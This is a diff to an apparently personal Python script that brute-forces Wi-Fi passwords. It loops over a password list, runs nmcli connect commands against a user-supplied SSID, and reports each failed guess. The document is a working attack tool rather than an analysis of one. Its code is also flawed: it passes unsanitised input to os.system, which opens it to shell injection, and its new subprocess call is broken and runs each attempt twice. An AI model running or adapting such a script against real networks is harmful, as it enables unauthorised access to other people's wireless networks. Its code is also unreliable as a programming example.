@@ -7,16 +7,17 @@
 import sys
 import os
 import time
-
+import subprocess
 flag = False
 
-os.system("nmcli device wifi")
+#os.system("nmcli device wifi")
 
 print("___ Enter the SSID ___ \n")
-ssid = input("SSID:")
+ssid_in = input("SSID:")
+ssid = f"\"{ssid_in}\""
 
-print("Please enter your sudo password :")
-os.system("sudo systemctl isolate multi-user.target")
+#print("Please enter your sudo password :")
+#os.system("sudo systemctl isolate multi-user.target")
 
 def pas():
 	os.chdir('/home/alex/Documents/Hacking')
@@ -38,7 +39,7 @@ _____BRUTEFORCER STARTING_____
 for i in banner:
     sys.stdout.write(i)
     sys.stdout.flush()
-    time.sleep(0.5)
+    time.sleep(0.2)
     
 time.sleep(0.02)
 								
@@ -51,13 +52,16 @@ for pswd in pswd_lst:
         continue
     
         
-    if count == 10:
-        os.system("sudo systemctl isolate graphical.target")
+#    if count == 10:
+#        os.system("sudo systemctl isolate graphical.target")
     
     count += 1
     
     try:
 	    cmd = (f"nmcli device wifi connect {ssid} password {pswd}")
+	    #cmd = ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', pswd]
+	    result = subprocess.run(str(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
 	    print("trying : " + pswd)
 	    
 	    result = os.system(cmd)
@@ -71,8 +75,9 @@ for pswd in pswd_lst:
 	    else: 
 	        print(f"-- Incorrect password {pswd}")
 	        
-    except OSError:
+    except Exception as e:
         print("+++ == AN ERROR OCCURED == +++")
+        print(f"{e}")
         break
 
 end_msg = " ___ BRUTEFORCE completed ___ "
